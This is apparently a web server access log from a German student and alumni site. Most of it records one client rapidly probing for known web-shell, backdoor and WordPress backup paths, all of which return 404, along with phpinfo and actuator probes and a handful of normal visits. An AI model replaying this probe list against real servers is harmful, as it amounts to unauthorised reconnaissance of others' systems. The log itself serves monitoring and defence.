7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:15;/;/about.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:15;/;/admin.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:17;/;/admin/controller/extension/extension/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:19;/;/admin/function.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:20;/;/akcc.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:22;/;/alfa.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:23;/;/api.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:23;/;/as.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:24;/;/asasx.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:24;/;/asd.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:25;/;/assets/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:26;/;/assets/images/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:26;/;/autoload_classmap/function.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:27;/;/bolt.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:28;/;/chosen.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:29;/;/classwithtostring.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:29;/;/dex.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:31;/;/doc.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:31;/;/ds.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:32;/;/edit.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:33;/;/file.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:33;/;/files/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:34;/;/files/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:34;/;/function.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:34;/;/gelay.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:35;/;/gfile.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:36;/;/gg.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:37;/;/goods.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:37;/;/i.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:37;/;/images/images/about.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:38;/;/images/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:39;/;/inc.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:40;/;/index.bak.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:41;/;/index/function.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:41;/;/info.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:42;/;/ini.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:43;/;/inputs.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:44;/;/ioxi-o.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:44;/;/item.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:45;/;/manager.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:46;/;/modules/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:48;/;/moon.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:49;/;/new.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:49;/;/past.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:51;/;/php/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:53;/;/radio.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:55;/;/robots.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:56;/;/shop.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:56;/;/themes.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:57;/;/tinyfilemanager.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:58:58;/;/upload/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:01;/;/vendor/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:02;/;/wp-admin.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:03;/;/wp-admin/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:04;/;/wp-admin/classwithtostring.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:07;/;/wp-admin/css/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:10;/;/wp-admin/css/colors/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:12;/;/wp-admin/css/colors/ectoplasm/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:14;/;/wp-admin/css/colors/light/function.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:25;/;/wp-admin/css/colors/midnight/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:26;/;/wp-admin/images/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:27;/;/wp-admin/includes/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:27;/;/wp-admin/includes/about.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:28;/;/wp-admin/includes/colour.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:28;/;/wp-admin/includes/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:28;/;/wp-admin/js/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:29;/;/wp-admin/js/widgets/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:30;/;/wp-admin/js/widgets/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:30;/;/wp-admin/mah.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:31;/;/wp-admin/maint/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:31;/;/wp-admin/meta/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:32;/;/wp-admin/network/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:32;/;/wp-admin/wp-admins.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:34;/;/wp-blog-header.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:34;/;/wp-comments.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:35;/;/wp-conflg.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:35;/;/wp-content/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:35;/;/wp-content/1.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:36;/;/wp-content/Geforce.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:36;/;/wp-content/admin.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:37;/;/wp-content/autoload_classmap.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:37;/;/wp-content/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:38;/;/wp-content/plugins/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:39;/;/wp-content/plugins/HelloDollyV2/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:39;/;/wp-content/plugins/admin.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:40;/;/wp-content/plugins/dummyyummy/wp-signup.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:41;/;/wp-content/plugins/pwnd/as.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:41;/;/wp-content/themes/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:41;/;/wp-content/themes/admin.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:42;/;/wp-content/themes/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:42;/;/wp-content/themes/themes.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:43;/;/wp-content/upgrade/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:43;/;/wp-content/upgrade/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:45;/;/wp-content/uploads/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:45;/;/wp-content/uploads/Geforce.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:46;/;/wp-content/uploads/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:48;/;/wp-good.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:49;/;/wp-includes/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:50;/;/wp-includes/ID3/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:53;/;/wp-includes/ID3/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:53;/;/wp-includes/IXR/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:54;/;/wp-includes/IXR/test1.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:56;/;/wp-includes/PHPMailer/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:58;/;/wp-includes/Requests/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:59;/;/wp-includes/Requests/Auth/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 01:59:59;/;/wp-includes/Requests/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:00;/;/wp-includes/SimplePie/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:00;/;/wp-includes/SimplePie/Content/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:01;/;/wp-includes/SimplePie/autoload_classmap.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:01;/;/wp-includes/SimplePie/chosen.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:02;/;/wp-includes/SimplePie/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:02;/;/wp-includes/Text/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:03;/;/wp-includes/Text/Diff/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:03;/;/wp-includes/Text/Diff/Engine/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:04;/;/wp-includes/Text/Diff/Renderer/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:04;/;/wp-includes/Text/Diff/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:05;/;/wp-includes/Text/wp-conflg.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:05;/;/wp-includes/assets/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:06;/;/wp-includes/assets/autoload_classmap.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:06;/;/wp-includes/bk/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:06;/;/wp-includes/block-bindings/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:06;/;/wp-includes/block-patterns/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:07;/;/wp-includes/block-supports/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:07;/;/wp-includes/blocks/shortcode/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:07;/;/wp-includes/certificates/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:08;/;/wp-includes/css/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:08;/;/wp-includes/css/dist/alam.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:08;/;/wp-includes/customize/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:09;/;/wp-includes/customize/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:09;/;/wp-content/cache/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:10;/;/wp-content/w3tc/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:11;/;/wp-content/et-cache/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:12;/;/wp-content/cache/supercache/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:12;/;/wp-content/wflogs/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:12;/;/wp-content/updraft/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:13;/;/wp-content/ai1wm-backups/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:13;/;/wp-content/backups-dup-lite/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:13;/;/wp-content/backup-db/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:14;/;/wp-content/uploads/woocommerce_uploads/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:14;/;/wp-content/uploads/woocommerce/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:16;/;/wp-content/uploads/wc-logs/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:16;/;/wp-includes/images/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:17;/;/wp-includes/js/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:17;/;/wp-includes/fonts/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:18;/;/wp-includes/fonts/autoload_classmap.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:18;/;/wp-includes/fonts/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:19;/;/wp-includes/html-api/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:19;/;/wp-includes/images/crystal/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:20;/;/wp-includes/images/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:21;/;/wp-includes/images/media/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:22;/;/wp-includes/images/media/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:23;/;/wp-includes/images/smilies/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:24;/;/wp-includes/images/wlw/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:24;/;/wp-includes/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:24;/;/wp-includes/js/codemirror/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:25;/;/wp-includes/js/crop/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:25;/;/wp-includes/js/jcrop/jcrop.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:25;/;/wp-includes/php-compat/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:25;/;/wp-includes/pomo/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:26;/;/wp-includes/random_compat/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:27;/;/wp-includes/rest-api/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:27;/;/wp-includes/rest-api/endpoints/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:28;/;/wp-includes/rest-api/fields/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:28;/;/wp-includes/rest-api/search/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:29;/;/wp-includes/sitemaps/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:30;/;/wp-includes/sitemaps/autoload_classmap.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:31;/;/wp-includes/sitemaps/providers/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:31;/;/wp-includes/sodium_compat/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:32;/;/wp-includes/sodium_compat/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:32;/;/wp-includes/sodium_compat/src/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:33;/;/wp-includes/style-engine/index.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:34;/;/wp-includes/style-engine/wp-conflg.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:34;/;/wp-includes/theme-compat/;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:35;/;/wp-includes/widgets/autoload_classmap.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:36;/;/wp-mail.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:36;/;/wp-signin.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:37;/;/wp-update.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:37;/;/wp.php;GET;404
7eab602e881b2292780f2c266106bdba94886f444957eeeb027d5e4b8bba0635;2025-11-28 02:00:38;/;/xmrlpc.php;GET;404
2c48d93c94a9eba6ed9a1ef3e8051c8f12f5c4a9ee33e2e49c23be612caa556c;2025-11-28 02:13:33;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-28 02:17:46;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-28 02:19:45;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
50291f8e4984fef821837d448f35306e12bacc5ab29eaae78685455b2491545e;2025-11-28 02:23:26;;/;GET;200
99bb88ae5f7f33a971558ac92a8dc6dab48d9edad02778e452bbebb4b58c4248;2025-11-28 02:26:36;;/xmlrpc.php;GET;404
d8838d442e6bdd098555c75b8b5783a0a017cc69fa32e8a459643c0aec075b12;2025-11-28 02:27:53;;/;GET;200
fff78639dc4db5ae5a7b469a0e0f4f53425d67c4eeeb4473b78b3c2d419aff32;2025-11-28 02:37:35;;/;GET;200
1885f861f76453b1da21398b731e0bb3df613cfc2530214aaf22905190e9ab4c;2025-11-28 02:38:50;;/;GET;200
978682ef132668235997f8b81b8b4b65ef29c5f44c1534211cab69942cb92bbd;2025-11-28 02:39:04;;/personen;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-28 02:44:43;/gruppen/hobby/debattieren;/personen/alumni/schule/164045;GET;200
c8833258c553db2374f271a358501b8687ce83814ee9ba2c2e4132cf6bbf17f4;2025-11-28 02:51:06;;/themen/details/der-start-ins-studium;GET;200
a4b983ec42da38247580003dea3f3285f52ed373aa30ee4be76856dd47cab9bd;2025-11-28 02:54:30;;/;GET;200
a4b983ec42da38247580003dea3f3285f52ed373aa30ee4be76856dd47cab9bd;2025-11-28 02:54:49;;/login;GET;200
370051dcb11113549dbcf33ef3137447324aad5046775542d62989bba1738ca6;2025-11-28 02:56:37;;/;GET;200
61454ec0a5af7272121898569f0a506c90197895c1b82654df3be86f0bd44f47;2025-11-28 02:58:44;;/themen?category=politik;GET;200
165376da2735949a3547f555fe21fa16ca4c9a243fb9f23f2549d888a7b4dac9;2025-11-28 03:00:48;/;/;GET;200
643e9390a82e1a774e34a9a50b06faa5ada00745e827e191c8d4aa816b7e7987;2025-11-28 03:17:27;;/personen/all/5;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-28 03:20:00;/gruppen/hobby/debattieren;/personen/alumni/schule/0349;GET;200
71da12f4a9e914850cfbc54afac83503ac1c799380b99949ff41221f3bc9e90b;2025-11-28 03:22:26;;/;GET;200
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:49;;/phpinfo.php;GET;404
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:50;;/info.php;GET;404
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:50;;/phpinfo;GET;404
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:53;;/php_info.php;GET;404
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:53;;/test.php;GET;404
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:53;;/_profiler/phpinfo;GET;404
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:55;;/;GET;200
f4b9702fee4ad9268586d18f5bc788382643fe5f8ac69c988227aa344e9f4d5c;2025-11-28 03:24:57;;/js;GET;404
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-28 03:25:05;;/rechtliches/impressum;GET;200
ebf020e8d12a4a86f35f3a9fc7f92186499ea4483cde8658af1518f393c0e6f2;2025-11-28 03:34:59;;/;GET;200
2b8329bc61806f93f75c484a19f59d52f4904f5c6240d09ec32aaf644c984951;2025-11-28 03:36:24;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
e79c997ca06f652385f5019f32a8c859af7ddfed7fcd5632a712b6199a8a075d;2025-11-28 03:50:35;;/;GET;200
ca80a7f4e4a86cc4780a12e1aea969c983766c3b851b674750dd5649a349eede;2025-11-28 03:58:46;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
